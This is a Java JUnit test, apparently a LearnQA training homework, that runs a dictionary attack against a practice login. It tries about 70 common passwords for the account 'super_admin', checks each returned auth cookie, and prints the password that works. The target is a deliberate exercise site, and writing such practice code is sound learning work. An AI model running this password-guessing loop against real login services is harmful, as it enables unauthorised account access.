import org.junit.jupiter.api.Test;
import io.restassured.RestAssured;
import io.restassured.response.Response;
import java.util.HashMap;
import java.util.Map;

public class FindPasswordTest {
    @Test
    public void FindPasswdTest() {

        String[] Array = {"123456", "123456789", "qwerty", "password", "111111",
                "1234567", "12345678", "12345", "iloveyou", "123123",
                "abc123", "qwerty123", "1q2w3e4r", "admin", "qwertyuiop",
                "654321", "555555", "lovely", "7777777", "welcome",
                "888888", "princess", "dragon", "password1", "123qwe", "football",
                "Football", "monkey", "letmein", "1234", "baseball", "sunshine",
                "trustno1", "adobe123", "login", "solo", "master", "qazwsx",
                "666666", "photoshop", "1qaz2wsx", "yesuiop", "ashley", "mustang", "121212",
                "starwars", "bailey", "access", "flower", "passw0rd", "shadow",
                "michael", "!@#$%^&*", "jesus", "superman", "hello", "charlie",
                "696969", "hottie", "freedom", "aayes6", "ninja", "azerty", "loveme", "whatever",
                "donald", "batman", "zaq1zaq1", "000000", "aa123456", "1234567890"};

        for (int i = 0; i < Array.length; i++) {

            Map<String, String> authData = new HashMap<>();
            authData.put("login", "super_admin");
            authData.put("password", Array[i]);

            //1. Получаем куки
            Response responseForGet = RestAssured
                    .given()
                    .body(authData)
                    .when()
                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                    .andReturn();

            String authCookie = responseForGet.getCookie("auth_cookie");

            Map<String, String> cookies = new HashMap<>();
            cookies.put("auth_cookie", authCookie);

            //2. Проверяем полученную куку
            Response responseForCheck = RestAssured
                    .given()
                    .body(authData)
                    .cookies(cookies)
                    .when()
                    .post("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                    .andReturn();

            //3. Если подошла, прекращаем проверять
            if (responseForCheck.asString().contains("You are authorized")) {
                responseForCheck.print();
                System.out.println("Верный пароль: " + Array[i]);
                break;
            }

        }
    }
}
